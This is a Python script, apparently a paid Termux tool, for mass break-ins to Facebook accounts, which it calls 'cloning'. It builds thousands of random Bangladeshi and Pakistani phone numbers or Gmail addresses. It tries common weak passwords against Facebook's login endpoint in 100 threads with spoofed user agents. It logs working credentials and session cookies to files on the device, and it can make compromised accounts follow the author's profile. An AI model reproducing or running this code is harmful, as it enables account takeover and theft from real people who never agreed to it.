# Facebook: Bd RANBO. BY MAHDI
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
ma4D1 = open
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'
Mahdi_Hasan = print    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/ma4D1')
os.system('xdg-open https://facebook.com/bk4human')


logo ="""
\033[1;91m ##     ##    ###    ##     ##  ########  #### 
\033[1;92m ###   ###   ## ##   ##     ##  ##     ##  ##
\033[1;93m #### ####  ##   ##  ##     ##  ##     ##  ##  
\033[1;91m ## ### ## ##     ## #########  ##     ##  ##
\033[1;92m ##     ## ######### ##     ##  ##     ##  ##
\033[1;93m ##     ## ##     ## ##     ##  ##     ##  ##  
\033[1;91m ##     ## ##     ## ##     ##  ########  ####
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;92m➣ \033[1;92mDEVOLPER   :            MAHDI HASAN SHUVO
\033[1;91m➣ \033[1;91mFACEBOOK   :            MAHDI HASAN
\033[1;92m➣ \033[1;92mWHATSAPP   :            01616406924
\033[1;91m➣ \033[1;91mGITHUB     :            MAHDI HASAN SHUVO
\033[1;92m➣ \033[1;92mTOOLS      :            MAHDI=MEX
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
"""

loop = 0
oks = []
cps = []


def clear():
    os.system('clear')
    Mahdi_Hasan(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    Mahdi_Hasan('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.5
    update = ('5.5')
    update = ('5.5')
    if str(v) in update:
        os.system('clear')
    else:pass
except:Mahdi_Hasan('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        Mahdi_Hasan('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF']
ugen=['Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)']

 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
 #####main####
# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL
def mahdi():
    os.system('clear')
    os.system('xdg-open https://facebook.com/ma4D1')
    Mahdi_Hasan(logo)
    print ('\033[2;93m[1]  Clone From RANDOM BD    \033[1;36m[V2]')
    print ('\x1b[2;91m[2]  Clone From GMAIL        \033[1;32m[V2]')
    print ('\x1b[2;96m[3]  Clone From RANDOM PK    \033[1;36m[V2]')
    print ('\x1b[2;92m[4]  Contact Me')
    print ('\x1b[1;95m[5]  Update Tools')
    print ('\x1b[1;96m[0]  EXIT\033[1;32m')
    print ('\x1b[1;92m------------------------------')
    action()
    print (50 * '-')
    action()
def action():
    global cpb
    global oks
    os.system('xdg-open https://facebook.com/ma4D1')
    shuvo = input('\nINPUT===>   ')
    if shuvo == '':
        print()
        action()
    elif shuvo == '1':
        os.system('clear')
        mahdi_bd()
    elif shuvo == '2':
        os.system('clear')
        mahdi_email()
    elif shuvo == '3':
        os.system('clear')
        mahdi_pk()
    elif shuvo == '4':
        os.system('clear')
        os.system('xdg-open https://github.com/Shuvo-BBHH')
        print (logo)
        print('[1] Facebook \n[2] Whatapp')
        mahd = input('Chouse :')
        if mahd =='1':
            os.system("xdg-open https://facebook.com/bk4human")
            mahdi()
        elif mahd == '2':
            os.system('xdg-open https://wa.me/+8801616406924')
            mahdi()

    elif mahd =='5':
        os.system('pip uninstall mahdi-mex')
        os.system('pip install mahdi-mex')
        time.sleep(5)
        xox('\x1b[92;1m\n TOOL UPDATE SUCCESSFUL :)\n')
        time.sleep(2)
        mahdi()
# APK CHECK EMIL
def mahdi_email():

    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")
    M= '@gmail.com' 
    AH = '@yahoo.com'
    DI  = '@hotmail.com'
    mgmail = random.choice([M])        
    rk1 = '.'
    rk2 = ''
    rk3 = ' '
    code = random.choice([rk1,rk2])            
    # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST NAME:\033[0;93m ')
    os.system('clear')
    Mahdi_Hasan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93mmahdi, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST NAME:\033[0;93m ')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        Mahdi_Hasan('\033[1;97m====================================================')
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        Mahdi_Hasan('\033[1;97m====================================================')
        for love in user:
            mahdiuser=fastname+code+lasttname+love
            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you','free fire',fastname+'123',lasttname+'123']
            uid = mahdiuser+'@gmail.com'
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")

#RANDOM BD     )
 
#_______
def mahdi_pk():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")

    code = input(f' [{xr}■{x}] PUT YOUR SIM CODE : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        Mahdi_Hasan('\033[1;97m====================================================')
        Mahdi_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        Mahdi_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        Mahdi_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        Mahdi_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','pakistan']
            uid = code+love
            for Mahdi in HamiiID:
                pwx.append(Mahdi)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")

     
# APK CHECK
def mahdi_bd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")
    rk1 = '016'
    rk2 = '017'
    rk3 = '018'
    rk4 = '019'
    code = random.choice([rk1,rk2,rk3,rk4])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:],love,love[2:],love+code,'i love you','Fuck you','bangladesh']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")



######################
# APK CHECK
def mahdi_rd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    Mahdi_Hasan(logo)
    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    Mahdi_Hasan(" ══════════════════════════════════════════")
    
    code = '10000'
    os.system('clear')
    Mahdi_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    Mahdi_Hasan(logo)
    passx = 0
    HamiiID = []
    Mahdi_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = ['free fire','i love you','Fuck you','bangladesh','alamin123','thank you','12345678']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'p.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
            'sec-ch-ua': '"Chromium";v="108", "Not=A?Brand";v="8"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\n\033[1;93m--------------[MAHDI-OK💥]--------------\n\x1b[2;91mNUMBER/EMAIL➣\033[2;32m:'+uid+'\n\x1b[1;95muid➣\033[2;32m:'+cid+'\033[1;32m\n\033[33mpass=➣\033[2;32m'+ps+'\n\x1b[0;38m[‎‎COOKIE]= \033[1;32m'+coki+'\n')
                cek_apk(session,coki)
                ma4D1('/sdcard/MAHDI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[MAHDI-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ma4D1('/sdcard/MAHDI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MAHDI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass


##########################################################################
def mex():
    imt = '=MAHDI=MEX='
    os.system('clear')
    print (logo)
    
    try:
        key1 = open('/sdcard/.android.txt', 'r').read()
    except IOError:
        os.system('clear')
        print (logo)
        print ('         FUCK YOUR BYPASS SYSTEM')
        print ('\x1b[1;92m        You dont have subscrption')
        print ('          This is paid command so need to aprove')
        print ('\033[1;92m         If you want to buy presh enter')
        print ('')
        myid = uuid.uuid4().hex[:10]
        print ('         YOUR KEY :\033[1;93m ' + myid + imt)
        kok = open('/sdcard/.android.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ('')
        raw_input('   \x1b[0;34mENTER TO BUY TOOLS ')
        os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r1 = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/mahdi-mex/main/ap.txt').text
    if key1 in r1:
        mahdi()
    else:
        os.system('clear')
        print (logo)
        print ('         FUCK YOUR BYPASS SYSTEM')
        print('')
        print ('         You dont have subscrption')
        print ('         THIS IS PAID COMMAND ')
        print ('')
        print ('         YOUR KEY : \033[1;93m' + key1)
        print ('')
        print ('        \x1b[0;34mIF YOU BUY TOOLS CONTACT ME')
        print ('')
        input('\033[1;92mIf you want to buy presh entero ')
        os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
#######################################################

if __name__ == '__main__':
    mex()